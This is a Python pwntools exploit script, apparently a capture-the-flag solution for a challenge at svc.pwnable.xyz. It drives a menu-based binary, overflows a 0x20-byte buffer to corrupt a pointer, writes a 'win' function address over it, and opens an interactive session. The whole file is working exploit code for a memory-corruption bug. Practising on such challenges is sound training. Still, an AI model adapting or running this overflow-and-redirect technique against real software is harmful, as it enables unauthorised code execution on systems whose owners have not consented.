from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30023)

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def write(data):
	init(1)
	print(target.recvuntil(": "))
	target.send(data)
	
def edit(index,data):
	init(2)
	print(target.recvuntil(": "))
	target.sendline(str(index))
	print(target.recvuntil(": "))
	target.send(data)

def leak(index):
	init(3)
	print(target.recvuntil(": "))
	target.sendline(str(index))

win=0x40092C
write("A"*0x20)
edit(0,"A"*0x20+"\x30")
edit(0,"A"*0x28+p64(win))
leak(0)
target.interactive()

	
	
